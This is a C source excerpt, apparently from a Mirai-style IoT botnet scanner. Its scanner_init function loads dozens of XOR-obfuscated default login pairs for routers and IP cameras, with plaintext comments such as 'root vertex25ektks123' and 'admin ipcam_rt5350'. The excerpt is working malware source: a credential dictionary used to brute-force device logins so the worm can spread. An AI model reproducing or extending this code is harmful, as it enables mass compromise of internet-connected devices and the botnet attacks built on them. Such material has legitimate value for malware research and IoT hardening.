...
void scanner_init(void)
{
    ...
    add_auth_entry("\x22\x27\x20\x35\x26\x37\x35\x39\x66\x64\x65\x61", "\x66\x64\x65\x61\x64\x62\x64\x66", 22); // vstarcam2015 20150602
	add_auth_entry("\x19\x10\x65\x65\x64", "\x3C\x31\x38\x24", 9);      //MD110 help
	add_auth_entry("\x37\x3B\x26\x31\x37\x31\x27\x27", "\x37\x3B\x26\x31\x37\x31\x27\x27", 16); //corecess corecess
	add_auth_entry("\x30\x3D\x35\x33", "\x27\x23\x3D\x20\x37\x3C", 10); // diag switch
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x35\x30\x39\x3D\x3A", 10); // admin admin
	add_auth_entry("\x35\x30\x39\x3D\x3A", "\x27\x23\x3D\x20\x37\x3C", 11); // admin switch
	...
	add_auth_entry("\x30\x26\x35\x2D\x20\x31\x3F", "\x65\x66\x67\x60", 11); // draytek 1234
    add_auth_entry("\x26\x3B\x3B\x20", "\x35\x30\x39\x3D\x3A", 9); // root admin
    add_auth_entry("\x26\x3B\x3B\x20", "\x22\x31\x26\x20\x31\x2C\x66\x61\x31\x3F\x20\x3F\x27\x65\x66\x67", 20); // root vertex25ektks123
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x22\x31\x26\x20\x31\x2C\x66\x61\x31\x3F\x20\x3F\x27\x65\x66\x67", 22); // admin vertex25ektks123
	...
	add_auth_entry("\x30\x31\x32\x35\x21\x38\x20", "\x35\x3A\x20\x27\x38\x25", 13);             // default antslq
    add_auth_entry("\x33\x21\x31\x27\x20", "\x2C\x37\x67\x61\x65\x65", 11); // guest xc3511
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x35\x25\x21\x35\x26\x3D\x3B", 12); // admin aquario
    add_auth_entry("\x27\x21\x24\x24\x3B\x26\x20", "\x27\x21\x24\x24\x3B\x26\x20", 14); // support support
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x24\x35\x27\x27\x23\x3B\x26\x30", 13); // admin password
    ...
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x65\x65\x65\x65", 9); // admin 1111
    ...
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x3D\x24\x37\x35\x39\x0B\x26\x20\x61\x67\x61\x64", 17); // admin ipcam_rt5350
    add_auth_entry("\x26\x3B\x3B\x20", "\x3D\x24\x37\x35\x39\x0B\x26\x20\x61\x67\x61\x64", 16); // root ipcam_rt5350
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x3C\x3B\x60\x21\x3F\x21\x62\x35\x20", 14); // admin ho4uku6at
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x3F\x3B\x3A\x20\x66\x64\x64\x60", 13); // admin kont2004
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x03\x3D\x3A\x65\x30\x3B\x03\x70", 13);              // admin Win1doW$ 
    add_auth_entry("\x26\x3B\x3B\x20", "\x3C\x21\x3A\x20\x61\x63\x61\x6D", 12);                // root hunt5759
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x17\x1B\x35\x30\x39\x3D\x3A\x65\x66\x67", 15);           // admin COadmin123
	...
	add_auth_entry("\x3A\x31\x20\x3B\x24\x3D\x35", "\x3A\x31\x20\x3B\x24\x3D\x35", 14);             // netopia netopia
	add_auth_entry("\x37\x35\x36\x38\x31\x37\x3B\x39", "\x26\x3B\x21\x20\x31\x26", 14);                   //cablecom router
